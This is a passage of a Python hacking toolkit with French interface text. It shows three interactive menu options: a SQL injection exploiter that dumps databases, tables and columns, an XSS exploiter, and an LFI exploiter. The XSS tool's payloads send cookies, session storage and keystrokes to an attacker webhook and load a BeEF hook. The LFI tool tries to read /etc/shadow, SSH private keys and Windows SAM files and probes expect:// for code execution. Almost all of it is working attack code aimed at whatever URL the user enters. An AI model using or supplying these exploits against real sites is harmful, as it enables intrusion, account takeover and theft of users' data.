        "columns":  "' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -",
        "dump":     "' UNION SELECT GROUP_CONCAT({col}),NULL FROM {table}-- -",
        "user":     "' UNION SELECT CONCAT(user(),':',database(),':',version()),NULL-- -",
    },
    "MSSQL": {
        "dbs":      "' UNION SELECT STRING_AGG(name,','),NULL FROM sys.databases-- -",
        "tables":   "' UNION SELECT STRING_AGG(name,','),NULL FROM sys.tables-- -",
        "columns":  "' UNION SELECT STRING_AGG(name,','),NULL FROM sys.columns WHERE object_id=OBJECT_ID('{table}')-- -",
        "dump":     "' UNION SELECT STRING_AGG(CAST({col} AS NVARCHAR(MAX)),','),NULL FROM {table}-- -",
        "user":     "' UNION SELECT CONCAT(SYSTEM_USER,':',DB_NAME(),':',@@version),NULL-- -",
    },
    "PostgreSQL": {
        "dbs":      "' UNION SELECT STRING_AGG(datname,','),NULL FROM pg_database-- -",
        "tables":   "' UNION SELECT STRING_AGG(tablename,','),NULL FROM pg_tables WHERE schemaname='public'-- -",
        "columns":  "' UNION SELECT STRING_AGG(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'-- -",
        "dump":     "' UNION SELECT STRING_AGG(CAST({col} AS TEXT),','),NULL FROM {table}-- -",
        "user":     "' UNION SELECT CONCAT(current_user,':',current_database(),':',version()),NULL-- -",
    },
    "SQLite": {
        "tables":   "' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- -",
        "columns":  "' UNION SELECT GROUP_CONCAT(name),NULL FROM pragma_table_info('{table}')-- -",
        "dump":     "' UNION SELECT GROUP_CONCAT({col},','),NULL FROM {table}-- -",
        "user":     "' UNION SELECT sqlite_version(),NULL-- -",
    },
}

SQLI_TIME_BASED = {
    "MySQL/MariaDB": ["' AND SLEEP(3)-- -", "' AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -"],
    "MSSQL":         ["'; WAITFOR DELAY '0:0:3'-- -", "' IF 1=1 WAITFOR DELAY '0:0:3'-- -"],
    "PostgreSQL":    ["'; SELECT pg_sleep(3)-- -", "' AND (SELECT 1 FROM pg_sleep(3))-- -"],
    "Oracle":        ["' AND 1=dbms_pipe.receive_message('a',3)--", "' AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',3)=1)--"],
    "SQLite":        ["' AND 1=randomblob(100000000)-- -"],
}

def _sqli_test(url, timeout=8, headers=None):
    if requests is None:
        return None
    h = headers or {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
        "Accept": "*/*",
    }
    try:
        start = time.time()
        r = requests.get(url, headers=h, timeout=timeout + 5, verify=False)
        elapsed = time.time() - start
        return (r.status_code, (r.text or "").lower(), elapsed, r.text or "")
    except Exception:
        return None

def _sqli_inject_url(base_url, param, payload):
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

def option_22():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ SQL INJECTION EXPLOIT ]{RESET}\n")
    print(f"{GRAY}  Cible : URL avec parametre(s), ex: http://site.com/page.php?id=1{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL vulnerable {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        print(f"{YELLOW}[!] Aucun parametre dans l'URL.{RESET}")
        param = input(f"{YELLOW}[?]{RESET} Nom du parametre a injecter {RED}->{RESET} ").strip()
        if not param:
            print(f"{RED}[!] Parametre requis.{RESET}")
            pause()
            return
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{param}=1"
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    else:
        print(f"{GREEN}[+] Parametres detectes : {', '.join(qs.keys())}{RESET}")
        param = input(f"{YELLOW}[?]{RESET} Parametre a injecter (def: {list(qs.keys())[0]}) {RED}->{RESET} ").strip()
        if not param:
            param = list(qs.keys())[0]

    if param not in qs:
        qs[param] = ["1"]

    print(f"\n{CYAN}   ETAPE 1 — FINGERPRINT DBMS{RESET}\n")
    detected_dbms = None

    dbms_errors = {
        "MySQL/MariaDB": ["mysql", "mariadb", "you have an error in your sql"],
        "MSSQL":         ["microsoft ole db", "sql server", "odbc sql server"],
        "PostgreSQL":    ["postgresql", "pg_query", "pg_exec"],
        "Oracle":        ["ora-", "oracle error"],
        "SQLite":        ["sqlite", "unrecognized token"],
    }

    for payload, dbms in SQLI_DBMS_FINGERPRINT:
        test_url = _sqli_inject_url(url, param, payload)
        print(f"{GRAY}  Test {dbms}...{RESET}", end="")
        res = _sqli_test(test_url)
        if not res:
            print(f" {RED}[echec reseau]{RESET}")
            continue
        status, body, elapsed, raw = res

        errs = dbms_errors.get(dbms, [])
        if any(e in body for e in errs):
            detected_dbms = dbms
            print(f" {GREEN}[+]{RESET}")
            break

        if dbms in SQLI_TIME_BASED and elapsed > 2.5:
            detected_dbms = dbms
            print(f" {GREEN}[+ time-based]{RESET}")
            break

        print(f" {GRAY}[-]{RESET}")

    if not detected_dbms:
        print(f"\n{YELLOW}[!] DBMS non identifie automatiquement.{RESET}")
        print(f"{GRAY}  Choisis manuellement :{RESET}")
        dbms_list = ["MySQL/MariaDB", "MSSQL", "PostgreSQL", "Oracle", "SQLite"]
        for i, d in enumerate(dbms_list, 1):
            print(f"  {PINK}({i}){RESET} {d}")
        try:
            c = int(input(f"{YELLOW}[?]{RESET} Choix {RED}->{RESET} ").strip())
            detected_dbms = dbms_list[c - 1] if 1 <= c <= len(dbms_list) else "MySQL/MariaDB"
        except (ValueError, IndexError):
            detected_dbms = "MySQL/MariaDB"
    else:
        print(f"\n{GREEN}[+] DBMS detecte : {detected_dbms}{RESET}")

    while True:
        print(f"\n{CYAN}   ACTIONS{RESET}\n")
        print(f"  {PINK}(1){RESET} Extraire la version + user + db")
        print(f"  {PINK}(2){RESET} Lister les bases de donnees")
        print(f"  {PINK}(3){RESET} Lister les tables")
        print(f"  {PINK}(4){RESET} Lister les colonnes d'une table")
        print(f"  {PINK}(5){RESET} Dump une table")
        print(f"  {PINK}(6){RESET} Test time-based blind")
        print(f"  {PINK}(7){RESET} Shell interactif (payload custom)")
        print(f"  {PINK}(0){RESET} Retour\n")

        act = input(f"{YELLOW}[?]{RESET} Choix {RED}->{RESET} ").strip() or "0"

        if act == "0":
            break

        payloads = SQLI_EXTRACT_PAYLOADS.get(detected_dbms, {})

        if act == "1":
            p = payloads.get("user")
            if not p:
                print(f"{RED}[!] Pas de payload user pour {detected_dbms}.{RESET}")
                continue
            test_url = _sqli_inject_url(url, param, p)
            res = _sqli_test(test_url)
            if res:
                status, body, elapsed, raw = res
                print(f"\n{GRAY}  Payload : {p}{RESET}")
                print(f"{GRAY}  Status  : {status}  |  Duree: {elapsed:.2f}s{RESET}")
                print(f"{GRAY}  --- extrait de la reponse ---{RESET}")
                for line in raw.splitlines():
                    if any(k in line.lower() for k in ("mysql", "mariadb", "postgres", "mssql", "root@", "information_schema")):
                        print(f"{CYAN}  {line.strip()[:200]}{RESET}")
                m = re.search(r"([a-z0-9_]+):([a-z0-9_]+):([0-9][0-9a-z.\-]{2,})", raw, re.IGNORECASE)
                if m:
                    print(f"\n{GREEN}[+] User    : {m.group(1)}{RESET}")
                    print(f"{GREEN}[+] DB      : {m.group(2)}{RESET}")
                    print(f"{GREEN}[+] Version : {m.group(3)}{RESET}")

        elif act == "2":
            p = payloads.get("dbs")
            if not p:
                print(f"{RED}[!] Pas de payload dbs pour {detected_dbms}.{RESET}")
                continue
            test_url = _sqli_inject_url(url, param, p)
            res = _sqli_test(test_url)
            if res:
                status, body, elapsed, raw = res
                print(f"\n{GRAY}  Payload : {p}{RESET}")
                m = re.search(r"([a-z0-9_]+(?:,[a-z0-9_]+){2,})", raw, re.IGNORECASE)
                if m:
                    dbs = m.group(1).split(",")
                    print(f"\n{GREEN}[+] {len(dbs)} bases de donnees :{RESET}")
                    for d in dbs[:50]:
                        print(f"  {CYAN}- {d}{RESET}")

        elif act == "3":
            p = payloads.get("tables")
            if not p:
                print(f"{RED}[!] Pas de payload tables pour {detected_dbms}.{RESET}")
                continue
            test_url = _sqli_inject_url(url, param, p)
            res = _sqli_test(test_url)
            if res:
                status, body, elapsed, raw = res
                print(f"\n{GRAY}  Payload : {p}{RESET}")
                m = re.search(r"([a-z0-9_]+(?:,[a-z0-9_]+){1,})", raw, re.IGNORECASE)
                if m:
                    tables = m.group(1).split(",")
                    print(f"\n{GREEN}[+] {len(tables)} tables :{RESET}")
                    for t in tables[:100]:
                        print(f"  {CYAN}- {t}{RESET}")

        elif act == "4":
            table = input(f"{YELLOW}[?]{RESET} Nom de la table {RED}->{RESET} ").strip()
            if not table:
                continue
            p_tpl = payloads.get("columns")
            if not p_tpl:
                print(f"{RED}[!] Pas de payload columns.{RESET}")
                continue
            p = p_tpl.format(table=table)
            test_url = _sqli_inject_url(url, param, p)
            res = _sqli_test(test_url)
            if res:
                status, body, elapsed, raw = res
                print(f"\n{GRAY}  Payload : {p}{RESET}")
                m = re.search(r"([a-z0-9_]+(?:,[a-z0-9_]+){1,})", raw, re.IGNORECASE)
                if m:
                    cols = m.group(1).split(",")
                    print(f"\n{GREEN}[+] {len(cols)} colonnes dans {table} :{RESET}")
                    for c in cols[:100]:
                        print(f"  {CYAN}- {c}{RESET}")

        elif act == "5":
            table = input(f"{YELLOW}[?]{RESET} Table {RED}->{RESET} ").strip()
            col = input(f"{YELLOW}[?]{RESET} Colonne a dumper {RED}->{RESET} ").strip()
            if not table or not col:
                continue
            p_tpl = payloads.get("dump")
            if not p_tpl:
                print(f"{RED}[!] Pas de payload dump.{RESET}")
                continue
            p = p_tpl.format(table=table, col=col)
            test_url = _sqli_inject_url(url, param, p)
            res = _sqli_test(test_url)
            if res:
                status, body, elapsed, raw = res
                print(f"\n{GRAY}  Payload : {p}{RESET}")
                m = re.search(r"([^,\s]{20,}(?:,[^,\s]{2,}){1,})", raw)
                if m:
                    values = m.group(1).split(",")
                    print(f"\n{GREEN}[+] {len(values)} valeurs :{RESET}")
                    for v in values[:100]:
                        print(f"  {CYAN}{v[:120]}{RESET}")

        elif act == "6":
            time_payloads = SQLI_TIME_BASED.get(detected_dbms, [])
            if not time_payloads:
                print(f"{RED}[!] Pas de payload time-based.{RESET}")
                continue
            for p in time_payloads:
                test_url = _sqli_inject_url(url, param, p)
                print(f"{GRAY}  Test : {p[:60]}...{RESET}", end="")
                res = _sqli_test(test_url, timeout=8)
                if res:
                    status, body, elapsed, raw = res
                    if elapsed > 2.5:
                        print(f" {GREEN}[+ vulnerable — {elapsed:.2f}s]{RESET}")
                    else:
                        print(f" {GRAY}[- {elapsed:.2f}s]{RESET}")
                else:
                    print(f" {RED}[echec]{RESET}")

        elif act == "7":
            print(f"{GRAY}  Tape ton payload SQL brut (sans le prefixe ').{RESET}")
            print(f"{GRAY}  Ex: UNION SELECT user(),NULL-- -{RESET}")
            print(f"{GRAY}  Tape 'exit' pour quitter.{RESET}\n")
            while True:
                custom = input(f"{PINK}sql>{RESET} ").strip()
                if custom.lower() in ("exit", "quit", "q"):
                    break
                if not custom:
                    continue
                test_url = _sqli_inject_url(url, param, "'" + custom)
                res = _sqli_test(test_url)
                if res:
                    status, body, elapsed, raw = res
                    print(f"\n{GRAY}  Status: {status}  |  Duree: {elapsed:.2f}s{RESET}")
                    snippet = raw[:500].replace("\n", " ")
                    print(f"{CYAN}  {snippet}{RESET}\n")
                else:
                    print(f"{RED}  [echec reseau]{RESET}\n")

    pause()

# ============================================================
#              OPTION 23 — XSS EXPLOIT
# ============================================================

XSS_EXPLOIT_PAYLOADS = {
    "steal_cookie":    "<script>fetch('https://{webhook}',{method:'POST',body:document.cookie})</script>",
    "steal_local":     "<script>fetch('https://{webhook}',{method:'POST',body:JSON.stringify(localStorage)})</script>",
    "steal_session":   "<script>fetch('https://{webhook}',{method:'POST',body:JSON.stringify(sessionStorage)})</script>",
    "keylogger":       "<script>document.addEventListener('keypress',e=>fetch('https://{webhook}',{method:'POST',body:e.key}))</script>",
    "redirect":        "<script>window.location='https://{webhook}/phish'</script>",
    "deface":          "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
    "screenshot":      "<script>fetch('https://{webhook}',{method:'POST',body:'screenshot'})</script>",
    "iframe_inject":   "<iframe src='https://{webhook}' style='width:100%;height:100%;position:fixed;top:0;left:0'></iframe>",
    "beef_hook":       "<script src='http://{webhook}:3000/hook.js'></script>",
    "keylogger_adv":   "<script>(function(){var k='';document.addEventListener('keydown',function(e){k+=e.key;if(k.length>50){fetch('https://{webhook}',{method:'POST',body:k});k='';}});})()</script>",
}

def _xss_test_reflection(url, timeout=8):
    if requests is None:
        return None
    try:
        r = requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
            timeout=timeout, verify=False,
        )
        return r
    except Exception:
        return None

def _xss_build_url(base_url, param, payload):
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

def option_23():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ XSS EXPLOIT ]{RESET}\n")
    print(f"{GRAY}  Cible : URL avec parametre reflechi, ex: http://site.com/search?q=test{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL cible {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if qs:
        print(f"{GREEN}[+] Parametres detectes : {', '.join(qs.keys())}{RESET}")
        param = input(f"{YELLOW}[?]{RESET} Parametre reflechi (def: {list(qs.keys())[0]}) {RED}->{RESET} ").strip()
        if not param:
            param = list(qs.keys())[0]
    else:
        param = input(f"{YELLOW}[?]{RESET} Nom du parametre reflechi {RED}->{RESET} ").strip()
        if not param:
            print(f"{RED}[!] Parametre requis.{RESET}")
            pause()
            return

    # --- etape 1 : detecter le contexte de reflection ---
    print(f"\n{CYAN}   ETAPE 1 — DETECTION DU CONTEXTE{RESET}\n")

    marker = "xss" + str(random.randint(10000, 99999))
    contexts = []

    print(f"{GRAY}  Envoi du marker '{marker}'...{RESET}")
    test_url = _xss_build_url(url, param, marker)
    r = _xss_test_reflection(test_url)
    if not r:
        print(f"{RED}[!] Pas de reponse du serveur.{RESET}")
        pause()
        return

    body = r.text or ""
    if marker not in body:
        print(f"{YELLOW}[!] Le marker n'apparait PAS dans la reponse.{RESET}")
        print(f"{GRAY}  Le parametre n'est pas reflechi tel quel — teste d'autres params.{RESET}")
        pause()
        return

    print(f"{GREEN}[+] Marker reflechi dans la reponse.{RESET}")

    idx = body.find(marker)
    before = body[max(0, idx - 200):idx]
    after = body[idx + len(marker):idx + len(marker) + 100]

    if "<script" in before.lower() and "</script" in after.lower():
        contexts.append(("JavaScript string", "entre <script> et </script>"))
    if '="' in before[-50:] or "='" in before[-50:]:
        contexts.append(("HTML attribute", "dans un attribut HTML"))
    if "<" in before[-100:] and ">" not in before[-100:]:
        contexts.append(("HTML tag content", "entre deux balises"))
    if not contexts:
        contexts.append(("HTML body", "corps de la page"))

    print(f"\n{GREEN}  Contexte(s) detecte(s) :{RESET}")
    for ctx, desc in contexts:
        print(f"  {CYAN}- {ctx} : {desc}{RESET}")
    print(f"\n{GRAY}  Extrait avant  : ...{before[-80:]}{RESET}")
    print(f"{GRAY}  Extrait apres  : {after[:80]}...{RESET}")

    # --- etape 2 : test des payloads basiques ---
    print(f"\n{CYAN}   ETAPE 2 — TEST DES PAYLOADS{RESET}\n")

    test_payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
    ]

    working = []
    for p in test_payloads:
        test_url = _xss_build_url(url, param, p)
        r = _xss_test_reflection(test_url)
        if not r:
            continue
        b = r.text or ""
        if p in b:
            print(f"{GREEN}[+]{RESET} {p[:60]}")
            working.append((p, "brut"))
        elif "<script>alert(1)</script>" in b:
            print(f"{YELLOW}[!]{RESET} {p[:60]} — partiellement filtre")
        else:
            print(f"{GRAY}[-]{RESET} {p[:60]}")

    if not working:
        print(f"\n{YELLOW}[!] Aucun payload ne passe tel quel.{RESET}")
        print(f"{GRAY}  Tentative d'encodages de contournement...{RESET}")
        bypass_payloads = [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script >alert(1)</script >",
            "<script\t>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        for p in bypass_payloads:
            test_url = _xss_build_url(url, param, p)
            r = _xss_test_reflection(test_url)
            if r and p in (r.text or ""):
                print(f"{GREEN}[+]{RESET} {p[:60]}")
                working.append((p, "bypass"))

    if not working:
        print(f"\n{RED}[!] Le parametre est reflechi mais filtre.{RESET}")
        print(f"{GRAY}  Essaie d'autres encodages ou un autre param.{RESET}")
        pause()
        return

    print(f"\n{GREEN}[+] {len(working)} payload(s) fonctionnel(s).{RESET}")

    # --- etape 3 : armes d'exploitation ---
    print(f"\n{CYAN}   ETAPE 3 — ARMES D'EXPLOITATION{RESET}\n")
    print(f"{GRAY}  Pour les payloads qui exfiltrent (cookie, session...), il faut un webhook.{RESET}")
    webhook = input(f"{YELLOW}[?]{RESET} URL webhook (discord/requestbin, ENTREE pour skip) {RED}->{RESET} ").strip()

    if webhook:
        print(f"\n{CYAN}   PAYLOADS D'EXPLOITATION{RESET}\n")
        print(f"{GRAY}  Copie le payload qui t'interesse et injecte-le dans le parametre '{param}'.{RESET}\n")

        for name, tpl in XSS_EXPLOIT_PAYLOADS.items():
            payload = tpl.replace("{webhook}", webhook)
            full_url = _xss_build_url(url, param, payload)
            print(f"{CYAN}  [{name}]{RESET}")
            print(f"{GRAY}    URL: {full_url[:160]}{'...' if len(full_url) > 160 else ''}{RESET}")
            print(f"{GRAY}    Payload: {payload[:120]}{'...' if len(payload) > 120 else ''}{RESET}")
            print()

        try:
            out_dir = Path(_safe_workdir()) / "Output" / "XSSExploit"
            out_dir.mkdir(parents=True, exist_ok=True)
            host = urllib.parse.urlparse(url).hostname or "target"
            safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
            report = out_dir / f"xss_{safe_host}_{int(time.time())}.html"

            with open(report, "w", encoding="utf-8") as f:
                f.write("<!DOCTYPE html>\n<html><head><meta charset='utf-8'>\n")
                f.write(f"<title>XSS Exploit — {url}</title>\n")
                f.write("<style>body{background:#fff;color:#fff;font-family:monospace;padding:20px;}")
                f.write("h1{color:#fff;}h2{color:#fff;margin-top:30px;}")
                f.write("a{color:#fff;word-break:break-all;}")
                f.write("pre{background:#fff;padding:10px;border-left:3px solid #fff;overflow-x:auto;}</style>\n")
                f.write("</head><body>\n")
                f.write(f"<h1>XSS Exploit Report</h1>\n")
                f.write(f"<p><b>Target:</b> {url}</p>\n")
                f.write(f"<p><b>Param:</b> {param}</p>\n")
                f.write(f"<p><b>Webhook:</b> {webhook}</p>\n")
                f.write(f"<p><b>Date:</b> {datetime.now().isoformat()}</p>\n")
                f.write(f"<p><b>Context:</b> {', '.join(c[0] for c in contexts)}</p>\n")

                f.write("<h2>Payloads fonctionnels</h2>\n<ul>\n")
                for p, kind in working:
                    full_url = _xss_build_url(url, param, p)
                    f.write(f"<li><a href='{full_url}' target='_blank'>{p[:80]}</a> <i>({kind})</i></li>\n")
                f.write("</ul>\n")

                f.write("<h2>Armes d'exploitation</h2>\n")
                for name, tpl in XSS_EXPLOIT_PAYLOADS.items():
                    payload = tpl.replace("{webhook}", webhook)
                    full_url = _xss_build_url(url, param, payload)
                    f.write(f"<h3>{name}</h3>\n")
                    f.write(f"<a href='{full_url}' target='_blank'>Tester</a>\n")
                    f.write(f"<pre>{payload}</pre>\n")

                f.write("</body></html>\n")

            print(f"\n{GREEN}[+] Rapport HTML : {report}{RESET}")

            try:
                if platform.system() == "Windows":
                    os.startfile(str(report))
                elif platform.system() == "Darwin":
                    subprocess.Popen(["open", str(report)])
                else:
                    subprocess.Popen(["xdg-open", str(report)])
            except Exception:
                pass

        except Exception as e:
            print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    # --- etape 4 : test interactif ---
    print(f"\n{CYAN}   ETAPE 4 — TEST INTERACTIF{RESET}\n")
    print(f"{GRAY}  Tape 'exit' pour quitter.{RESET}\n")

    while True:
        custom = input(f"{PINK}xss>{RESET} ").strip()
        if custom.lower() in ("exit", "quit", "q"):
            break
        if not custom:
            continue
        test_url = _xss_build_url(url, param, custom)
        r = _xss_test_reflection(test_url)
        if r:
            body = r.text or ""
            if custom in body:
                print(f"{GREEN}  [+] Payload reflechi tel quel{RESET}")
            else:
                print(f"{YELLOW}  [!] Payload non reflechi tel quel (peut etre encode){RESET}")
            print(f"{GRAY}  URL: {test_url[:160]}{RESET}\n")
        else:
            print(f"{RED}  [echec reseau]{RESET}\n")

    pause()

# ============================================================
#              OPTION 24 — LFI EXPLOITER
# ============================================================

LFI_TARGETS = {
    "linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/issue", "/etc/group", "/etc/crontab",
        "/root/.ssh/id_rsa", "/root/.bash_history",
        "/home/{user}/.ssh/id_rsa", "/home/{user}/.bash_history",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/auth.log", "/var/log/syslog",
        "/proc/self/environ", "/proc/self/cmdline", "/proc/version", "/proc/cpuinfo",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\unattend.xml",
        "C:\\Windows\\system.ini",
        "C:\\boot.ini",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "C:\\xampp\\apache\\logs\\access.log",
        "C:\\xampp\\htdocs\\",
        "C:\\wamp\\logs\\access.log",
    ],
}

LFI_TRAVERSAL_PREFIXES = [
    "../", "..\\", "....//", "....\\\\", "..%2f", "..%5c",
    "%2e%2e%2f", "%2e%2e/", "..%252f", "%252e%252e%252f", "..%c0%af", "..%c1%9c",
]

LFI_WRAPPER_PAYLOADS = [
    ("PHP filter (source)", "php://filter/convert.base64-encode/resource={target}"),
    ("PHP input",           "php://input"),
    ("PHP data",            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"),
    ("PHP expect (RCE)",    "expect://id"),
    ("PHP zip (nested)",    "zip://{target}%23file.txt"),
    ("PHP phar (nested)",   "phar://{target}"),
    ("PHP file",            "file://{target}"),
    ("PHP glob",            "glob://{target}*"),
]

LFI_SIGNATURES_EXT = {
    "/etc/passwd":            ["root:x:0:0:", "root:*:0:0:", "daemon:x:", "bin:x:"],
    "/etc/shadow":            ["root:$", "root:*:", "bin:*:"],
    "/etc/hosts":             ["127.0.0.1", "localhost", "::1"],
    "/etc/hostname":          [],
    "/etc/issue":             ["Ubuntu", "Debian", "CentOS", "Linux"],
    "win.ini":                ["[fonts]", "[extensions]", "[mci extensions]"],
    "boot.ini":               ["[boot loader]", "[operating systems]"],
    "Unattend.xml":           ["<unattend", "Microsoft-Windows"],
    "id_rsa":                 ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
    "access.log":             ["GET /", "POST /", "HTTP/1"],
    "error.log":              ["[error]", "[warn]", "AH0"],
    "auth.log":               ["sshd", "session opened", "authentication failure"],
    "syslog":                 ["kernel:", "systemd:", "cron:"],
    "environ":                ["PATH=", "USER=", "HOME=", "SHELL="],
    "cmdline":                ["python", "nginx", "apache", "php"],
    "version":                ["Linux version"],
    "cpuinfo":                ["processor", "vendor_id"],
    ".bash_history":          ["ls ", "cd ", "sudo ", "cat "],
}

def _lfi_looks_like_content(body, target_path):
    if not body:
        return False
    for key, sigs in LFI_SIGNATURES_EXT.items():
        if key in target_path and sigs:
            if any(s in body for s in sigs):
                return True
    generic = ["root:x:0:0:", "[extensions]", "[fonts]", "BEGIN RSA PRIVATE KEY",
               "PATH=", "USER=", "Linux version"]
    return any(p in body for p in generic)

def option_24():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ LFI EXPLOITER ]{RESET}\n")
    print(f"{GRAY}  Cible : URL avec un parametre vulnerable, ex: http://site.com/page.php?file=home{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL vulnerable {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if qs:
        print(f"{GREEN}[+] Parametres : {', '.join(qs.keys())}{RESET}")
        lfi_params = ["file", "page", "path", "include", "template", "view", "load", "doc", "lang", "content"]
        default_param = next((p for p in qs.keys() if p in lfi_params), list(qs.keys())[0])
        param = input(f"{YELLOW}[?]{RESET} Parametre (def: {default_param}) {RED}->{RESET} ").strip() or default_param
    else:
        param = input(f"{YELLOW}[?]{RESET} Nom du parametre (def: file) {RED}->{RESET} ").strip() or "file"
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{param}=home"

    print(f"\n{CYAN}   OPTIONS{RESET}\n")
    try:
        to = float(input(f"{YELLOW}[?]{RESET} Timeout (def 8s) {RED}->{RESET} ").strip() or "8")
        to = max(1, min(30, to))
    except ValueError:
        to = 8

    print(f"\n{CYAN}   PLATEFORME CIBLE{RESET}\n")
    print(f"  {PINK}(1){RESET} Linux")
    print(f"  {PINK}(2){RESET} Windows")
    print(f"  {PINK}(3){RESET} Auto (teste les deux)")
    print()
    plat = input(f"{YELLOW}[?]{RESET} Choix (1-3, def 3) {RED}->{RESET} ").strip() or "3"

    def inject(payload):
        parsed2 = urllib.parse.urlparse(url)
        qs2 = urllib.parse.parse_qs(parsed2.query, keep_blank_values=True)
        qs2[param] = [payload]
        new_q = urllib.parse.urlencode(qs2, doseq=True)
        test_url = urllib.parse.urlunparse(parsed2._replace(query=new_q))
        try:
            r = requests.get(test_url,
                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                             timeout=to, verify=False)
            return r.status_code, r.text or "", test_url
        except Exception:
            return None, "", test_url

    findings = []

    print(f"\n{CYAN}   ETAPE 1 — PATH TRAVERSAL DE BASE{RESET}\n")

    test_cases = []
    if plat in ("1", "3"):
        test_cases += [("/etc/passwd", "linux")]
    if plat in ("2", "3"):
        test_cases += [("C:\\Windows\\win.ini", "windows"), ("C:\\boot.ini", "windows")]

    working_prefix = None
    working_target = None

    for target, platform_name in test_cases:
        found_here = False
        for prefix in LFI_TRAVERSAL_PREFIXES:
            depth = 6
            payload = (prefix * depth) + target.lstrip("/\\")
            status, body, test_url = inject(payload)

            if status is None:
                continue

            if _lfi_looks_like_content(body, target):
                findings.append({
                    "platform": platform_name,
                    "target": target,
                    "prefix": prefix,
                    "depth": depth,
                    "status": status,
                    "size": len(body),
                    "url": test_url,
                    "body": body[:2000],
                })
                print(f"{GREEN}[+] {target}{RESET}")
                print(f"{GRAY}    Prefix : {prefix} x{depth}{RESET}")
                print(f"{GRAY}    Status : {status}  |  Size: {len(body)}{RESET}")
                if working_prefix is None:
                    working_prefix = prefix
                    working_target = target
                found_here = True
                break

        if not found_here:
            print(f"{GRAY}[-] {target} — pas de lecture{RESET}")

    if not findings:
        print(f"\n{YELLOW}[!] Path traversal simple ne marche pas.{RESET}")

    print(f"\n{CYAN}   ETAPE 2 — PHP WRAPPERS{RESET}\n")

    wrapper_working = None
    for name, tpl in LFI_WRAPPER_PAYLOADS:
        if "{target}" in tpl:
            if working_target:
                payload = tpl.format(target=working_target)
            else:
                payload = tpl.format(target="/etc/passwd")
        else:
            payload = tpl

        status, body, test_url = inject(payload)
        if status is None:
            print(f"{GRAY}[-] {name} : echec reseau{RESET}")
            continue

        if name.startswith("PHP filter") and body and len(body) > 20:
            b64_match = re.search(r"([A-Za-z0-9+/=]{40,})", body)
            if b64_match:
                import base64
                try:
                    decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="ignore")
                    if decoded:
                        print(f"{GREEN}[+]{RESET} {name} : base64 detecte")
                        print(f"{GRAY}    Decode : {decoded[:200]}{RESET}")
                        wrapper_working = (name, payload, decoded)
                        break
                except Exception:
                    pass

        if name == "PHP expect (RCE)":
            if body and ("uid=" in body or "gid=" in body):
                print(f"{GREEN}[+]{RESET} {name} — RCE possible !")
                print(f"{GRAY}    Output : {body[:200]}{RESET}")
                wrapper_working = (name, payload, body)
                break

        if name == "PHP input" and status == 200:
